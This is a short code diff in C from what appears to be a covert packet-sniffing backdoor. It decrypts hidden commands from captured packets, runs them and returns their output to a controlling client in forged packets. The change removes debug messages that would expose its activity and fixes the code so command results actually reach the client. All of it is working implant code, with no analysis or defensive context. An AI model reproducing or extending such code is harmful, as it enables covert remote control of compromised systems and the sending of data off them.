@@ -140,8 +140,6 @@ void packet_callback(unsigned char *args, const struct pcap_pkthdr *pkt_header,
 	strncpy(decrypted, (char *)aes_decrypt(&decrypt, (unsigned char *)payload,
 				&size_payload), size_payload);
 
-	fprintf(stderr, "decrypted packet: %s", decrypted);
-
 	if ((start = strstr(decrypted, EXT_CMD_START)) && server) {
 		/* process external command */
 		start += strlen(EXT_CMD_START);
@@ -165,10 +163,9 @@ void packet_callback(unsigned char *args, const struct pcap_pkthdr *pkt_header,
 						file)) != 0) {
 			memset(command, 0x0, MAX_PKT_LEN);
 			sprintf(command, "%s%s%s", RESULT_START, buffer, RESULT_END);
-			memset(buffer, 0x0, MAX_PKT_LEN);
 
-			packet_forge(buffer, SERVER_IP, CLIENT_IP);
-			fprintf(stderr, "sending to client %s\n", CLIENT_IP);
+			packet_forge(command, SERVER_IP, CLIENT_IP);
+			memset(buffer, 0x0, MAX_PKT_LEN);
 		}
 	}
 	else if ((start = strstr(decrypted, WATCH_CMD_START)) && server) {
